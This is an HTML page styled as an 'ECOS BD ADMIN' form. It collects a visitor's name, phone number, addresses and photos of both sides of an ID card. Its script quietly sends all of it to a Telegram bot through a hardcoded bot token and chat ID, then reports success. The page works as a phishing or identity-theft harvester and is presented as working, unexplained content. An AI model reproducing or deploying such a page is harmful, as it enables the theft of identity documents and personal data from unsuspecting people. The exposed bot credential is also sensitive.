<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ECOS BD ADMIN</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
    }

    h1 {
      font-size: 2.5rem;
      background: linear-gradient(90deg, #00c6ff, #0072ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: fadeInDown 1s ease-out;
    }

    @keyframes fadeInDown {
      0% { transform: translateY(-50px); opacity: 0; }
      100% { transform: translateY(0); opacity: 1; }
    }

    form {
      width: 100%;
      max-width: 500px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 15px;
      padding: 25px;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
      backdrop-filter: blur(10px);
      animation: fadeInUp 1s ease-out;
    }

    @keyframes fadeInUp {
      0% { transform: translateY(50px); opacity: 0; }
      100% { transform: translateY(0); opacity: 1; }
    }

    input, textarea {
      width: 100%;
      padding: 12px;
      margin-top: 12px;
      border: none;
      border-radius: 8px;
      background: rgba(255,255,255,0.2);
      color: white;
      font-size: 16px;
      outline: none;
    }

    input[type="file"] {
      background: rgba(255,255,255,0.1);
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 20px;
      background: #00c6ff;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      color: white;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #0072ff;
    }

    .success-message {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: #2ecc71;
      color: white;
      font-size: 24px;
      justify-content: center;
      align-items: center;
      z-index: 999;
    }

  </style>
</head>
<body>

  <h1>ECOS BD ADMIN</h1>

  <form id="userForm">
    <input type="text" name="name" placeholder="Enter your full name" required>
    <input type="text" name="phone" placeholder="Enter your personal number" required>
    <textarea name="current" placeholder="Enter current address" required></textarea>
    <textarea name="permanent" placeholder="Enter permanent address" required></textarea>
    <label style="margin-top:15px;">Upload ID Front Part:</label>
    <input type="file" name="idFront" accept="image/*" required>
    <label style="margin-top:15px;">Upload ID Back Part:</label>
    <input type="file" name="idBack" accept="image/*" required>
    <button type="submit">Submit</button>
  </form>

  <div class="success-message" id="successMessage">
    ‚úÖ Submitted Successfully!
  </div>

  <script>
    const form = document.getElementById('userForm');
    const success = document.getElementById('successMessage');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const name = form.name.value;
      const phone = form.phone.value;
      const current = form.current.value;
      const permanent = form.permanent.value;

      const idFront = form.idFront.files[0];
      const idBack = form.idBack.files[0];

      const botToken = '7740440025:AAEiGnCvT10rcNe3fwDS-l-jLJjCWGyT0Lk';
      const chatId = '6593402184';

      // Send text data
      const message = `üìã New User Submission:\n\nüë§ Name: ${name}\nüìû Phone: ${phone}\nüè† Current Address: ${current}\nüè° Permanent Address: ${permanent}`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      // Send ID front
      const fd1 = new FormData();
      fd1.append('chat_id', chatId);
      fd1.append('photo', idFront);
      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: fd1
      });

      // Send ID back
      const fd2 = new FormData();
      fd2.append('chat_id', chatId);
      fd2.append('photo', idBack);
      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: fd2
      });

      form.reset();
      success.style.display = 'flex';
    });
  </script>

</body>
</html>
